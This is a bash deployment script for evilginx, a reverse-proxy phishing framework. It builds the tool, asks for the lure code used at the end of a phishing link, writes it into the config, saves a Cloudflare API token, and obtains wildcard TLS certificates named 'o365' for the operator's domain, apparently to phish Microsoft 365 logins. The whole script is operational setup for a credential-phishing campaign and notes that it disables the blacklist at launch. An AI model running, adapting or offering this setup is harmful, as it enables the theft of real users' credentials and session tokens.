#!/bin/bash
go mod tidy
go mod vendor
go build -o ./bin/evilginx -buildvcs=false


LURE=$(whiptail --title "eXpress Install" --inputbox "Select lure code at the end of a phishing link" 8 40 "" 3>&1 1>&2 2>&3)
exitstatus=$?
if [ $exitstatus = 0 ]; then
    sed -i s/BYMURbys/"$LURE"/g ../config/config.yaml || sed -i s/BYMURbys/"$LURE"/g ./config/config.yaml || sed -i s/BYMURbys/"$LURE"/g config/config.yaml
fi
whiptail --title "eXpress Install" --msgbox "eXpress install has completed. Launching evilginx after this message (disables the blacklist temporarily)""\n""The page is enabled and should be accessible at $SUBDOMAIN $DOMAIN / $LURE" 12 55 3>&1 1>&2 2>&3

OUT=cf_api_token.conf

if [ -s cf_api_token.conf ]; then
    CLOUDFLARE_DNS_API_TOKEN=$(<$OUT)
    (whiptail --title "API Token" --msg "Cloudflare API Token $CLOUDFLARE_DNS_API_TOKEN is using previously saved entry, delete cf_api_token.conf to disable this" 10 40 3>&1 1>&2 2>&3)
else
    CLOUDFLARE_DNS_API_TOKEN=$(whiptail --title "Enter Cloudflare API Token" --inputbox "Cloudflare API Token" 10 40 "$CLOUDFLARE_DNS_API_TOKEN" 3>&1 1>&2 2>&3)
    exitstatus=$?
    if [ $exitstatus = 0 ]; then
        echo -e "$CLOUDFLARE_DNS_API_TOKEN" | sudo tee $OUT
    else
        exit 1
    fi
fi

(whiptail --title "Wildcard Certificates" --yesno "Request new wildcard certificates for $DOMAIN and *.$DOMAIN?" 10 40 3>&1 1>&2 2>&3)
exitstatus=$?
if [ $exitstatus -eq 0 ]; then
    if [[ ! -f ./lego || ! -f ../lego || ! -f lego ]]; then
        wget https://github.com/go-acme/lego/releases/download/v4.8.0/lego_v4.8.0_linux_amd64.tar.gz -O ./lego.tar.gz && tar xf ./lego.tar.gz
    fi
    set -ex
    (CLOUDFLARE_DNS_API_TOKEN=$CLOUDFLARE_DNS_API_TOKEN ./lego --accept-tos --filename o365 --path ./ --dns cloudflare --email hostmaster@"$DOMAIN" --domains "$DOMAIN" --domains *."$DOMAIN" run) &&
        rm -rf ./certificates/o365.issuer.crt ./certificates/o365.json &&
        mkdir -p ./config/crt &&
        cp -a ./certificates/o365.key ../config/crt/"$DOMAIN"/o365.key &&
        cp -a ./certificates/o365.crt ../config/crt/"$DOMAIN"/o365.crt
else
    exit 1
fi

cd .. && make
